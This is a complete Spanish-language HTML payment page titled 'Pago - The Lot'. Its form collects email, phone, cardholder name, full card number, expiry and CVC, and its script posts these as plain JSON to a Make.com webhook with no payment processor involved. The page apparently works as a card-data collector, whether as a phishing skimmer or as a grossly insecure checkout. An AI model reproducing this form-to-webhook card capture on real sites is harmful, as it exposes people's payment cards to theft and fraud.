<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Pago - The Lot</title>
  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
  <style>
    body {
      font-family: 'Helvetica Neue', Helvetica, sans-serif;
      background: #f5f5f5;
      margin: 0;
      padding: 2rem;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      color: #003A7E;
    }
    .container {
      background: #fff;
      padding: 2rem;
      border-radius: 16px;
      box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
      max-width: 400px;
      width: 100%;
    }
    form {
      display: flex;
      flex-direction: column;
      gap: 1.5rem;
    }
    input, select {
      padding: 1rem;
      font-size: 1rem;
      border: 2px solid #003A7E;
      border-radius: 12px;
    }
    input[readonly] {
      background: #e9ecef;
      cursor: not-allowed;
    }
    button {
      background-color: #003A7E;
      color: white;
      border: none;
      padding: 1rem;
      font-size: 1.2rem;
      border-radius: 12px;
      cursor: pointer;
      transition: background-color 0.3s;
    }
    button:hover {
      background-color: #3D93F7;
    }
  </style>
</head>
<body>

<div class="container">
  <h1>Detalles de Pago</h1>
  <form id="pagoForm">
    <input type="email" id="customer_email" placeholder="Correo electrónico" required>
    <input type="tel" id="customer_phone" placeholder="Número de teléfono" required>

    <label for="card_type">Tipo de tarjeta</label>
    <select id="card_type" name="card_type" required>
      <option value="">Selecciona tipo</option>
      <option value="Visa">Visa</option>
      <option value="Mastercard">Mastercard</option>
      <option value="AMEX">AMEX</option>
    </select>

    <input type="text" id="card_name" placeholder="Nombre en la tarjeta" required>
    <input type="text" id="card_number" placeholder="Número de tarjeta" required maxlength="16">
    <input type="text" id="card_expiry" placeholder="MM/AA" required maxlength="5">
    <input type="text" id="card_cvc" placeholder="CCV" required maxlength="4">

    <label for="amount_display">Monto a pagar</label>
    <input type="text" id="amount_display" readonly>
    <input type="hidden" id="amount" name="amount">

    <!-- Google reCAPTCHA -->
    <div class="g-recaptcha" data-sitekey="6LfEvCcrAAAAAD0pDf2NlUYxazGY_iAZDwPPmGQ8"></div>

    <button type="submit">Pay</button>
  </form>
</div>

<script>
  const form = document.getElementById('pagoForm');
  const params = new URLSearchParams(window.location.search);
  const amount = params.get('amount') || '0.00';
  document.getElementById('amount_display').value = amount;
  document.getElementById('amount').value = amount;

  form.addEventListener('submit', async function(e) {
    e.preventDefault();

    const recaptchaResponse = grecaptcha.getResponse();
    if (!recaptchaResponse) {
      alert('Por favor completa el reCAPTCHA.');
      return;
    }

    const data = {
      customer_email: document.getElementById('customer_email').value,
      customer_phone: document.getElementById('customer_phone').value,
      card_type: document.getElementById('card_type').value,
      card_name: document.getElementById('card_name').value,
      card_number: document.getElementById('card_number').value,
      card_expiry: document.getElementById('card_expiry').value,
      card_cvc: document.getElementById('card_cvc').value,
      amount: document.getElementById('amount').value,
      'g-recaptcha-response': recaptchaResponse
    };

    try {
      await fetch('https://hook.us2.make.com/j4shhdd1b8axa0ycwq857159hga53tla', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      });
      window.location.href = 'gracias.html';
    } catch (error) {
      console.error('Error enviando los datos:', error);
      alert('Ocurrió un error al procesar tu pago. Intenta nuevamente.');
    }
  });
</script>

</body>
</html>
